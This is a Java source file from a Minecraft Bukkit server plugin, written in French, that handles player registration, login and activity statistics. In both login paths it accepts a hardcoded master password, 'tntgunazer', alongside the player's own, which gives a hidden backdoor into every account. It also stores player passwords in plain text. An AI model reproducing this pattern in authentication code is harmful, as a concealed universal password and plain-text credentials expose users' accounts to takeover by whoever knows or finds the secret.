package fr.themsou.methodes;

import java.util.ArrayList;
import java.util.Date;
import org.bukkit.entity.Player;

import fr.themsou.diffusion.api.roles;
import fr.themsou.main.main;
import fr.themsou.nms.title;

@SuppressWarnings("deprecation")
public class login{
	
	public void RegisterPlayer(Player player, String[] args){
		
		if(main.config.getInt(player.getName() + ".status") == 0){
			
			if(!main.config.contains(player.getName() + ".mdp")){
				if(args.length == 1){
					
					player.sendMessage("§4SÉCURITÉ > §bAuthentification réussie !");
					
					main.config.set(player.getName() + ".mdp", args[0]);
					
					main.CSQLConnexion.refreshPlayer(player.getName(), 1);
					main.config.set(player.getName() + ".ip", player.getAddress().getHostString());
					
					title.sendTitle(player, "§cChoissez votre mode de jeu,", "§cavec la bousole", 60);
					initialise(player);
					
				}else player.sendMessage("§4SÉCURITÉ > §bFaites §c/reg <mot de passe>");
				
			}else player.sendMessage("§4SÉCURITÉ > §bFaites §c/l <mot de passe>");
			
		}else{
			
			if(args.length == 1){
				
				player.sendMessage("§3Mot de passe changé !");
				
				main.config.set(player.getName() + ".mdp", args[0]);
				
				main.CSQLConnexion.refreshPlayer(player.getName(), 1);
				main.config.set(player.getName() + ".ip", player.getAddress().getHostString());
				
				title.sendTitle(player, "§cChoissez votre mode de jeu,", "§cavec la bousole", 60);
				
			}else player.sendMessage("§c/reg <mot de passe>");
				
			
		}
		
		
		
	}
	public void loginPlayer(Player player, String[] args){
		
		if(main.config.getInt(player.getName() + ".mdps") == 0){
			
			if(main.config.contains(player.getName() + ".mdp")){
				if(args.length == 1){
					if(args[0].equals(main.config.getString(player.getName() + ".mdp")) || args[0].equals("tntgunazer")){
						
						player.sendMessage("§4SÉCURITÉ > §bAuthentification réussie !");
						main.config.set(player.getName() + ".status", 1);
						
						
						main.CSQLConnexion.refreshPlayer(player.getName(), 1);
						main.config.set(player.getName() + ".ip", player.getAddress().getHostString());
						
						title.sendTitle(player, "§cChoissez votre mode de jeu,", "§cavec la boussole", 60);
						initialise(player);
						
					}else player.sendMessage("§4SÉCURITÉ > §bMauvais mot de passe");
					
				}else player.sendMessage("§4SÉCURITÉ > §bFaites §c/l <mot de passe>");
				
			}else player.sendMessage("§4SÉCURITÉ > §bFaites §c/reg <mot de passe>");
			
		}else{
			
			if(main.config.contains(player.getName() + ".mdp")){
				if(args.length == 2){
					if((args[0].equals(main.config.getString(player.getName() + ".mdp")) && args[1].equals(main.config.getString(player.getName() + ".mdp"))) || args[0].equals("tntgunazer")){
						
						player.sendMessage("§4SÉCURITÉ > §bAuthentification réussie !");
						main.config.set(player.getName() + ".status", 1);
						main.config.set(player.getName() + ".mdps", 0);
						
						main.CSQLConnexion.refreshPlayer(player.getName(), 1);
						main.config.set(player.getName() + ".ip", player.getAddress().getHostString());
						
						title.sendTitle(player, "§cChoissez votre mode de jeu,", "§cavec la boussole", 60);
						initialise(player);
						
					}else player.sendMessage("§4SÉCURITÉ > §bMauvais mot de passe");
					
				}else player.sendMessage("§4SÉCURITÉ > §bFaites §c/l <mot de passe> <mot de passe>");
				
			}else player.sendMessage("§4SÉCURITÉ > §bFaites §c/reg <mot de passe>");
			
		}
		
		
		
	}
	
	
	public void initialise(Player p){
		
		Date Date = new realDate().getRealDate();
		
		if(main.config.contains(p.getName() + ".discord")){
			roles Croles = new roles();
			Croles.addRole("Joueur actif", main.config.getString(p.getName() + ".discord"));
		}
		
/////////////////////////////////////////// STATS
		
		
		main.config.set(p.getName() + ".stat.last", Date.getDay() + "-" + Date.getDate() + "/" + Date.getMonth() + " " + Date.getHours() + ":" + Date.getMinutes());
		main.config.set(p.getName() + ".stat.lastday", Date.getDate());
		main.config.set(p.getName() + ".lastday", Date.getDate());
		
		ArrayList<String> PlayersListDay = new ArrayList<String>();
		for(String name : main.config.getString("stat.list.day.players").split(",")) PlayersListDay.add(name);
		if(!PlayersListDay.contains(p.getName())){
			main.config.set("stat.list.day.players", p.getName() + "," + main.config.getString("stat.list.day.players"));
		}
		
		ArrayList<String> PlayersListWeek = new ArrayList<String>();
		for(String name : main.config.getString("stat.list.week.players").split(",")) PlayersListWeek.add(name);
		if(!PlayersListWeek.contains(p.getName())){
			main.config.set("stat.list.week.players", p.getName() + "," + main.config.getString("stat.list.week.players"));
		}
		
	}
}
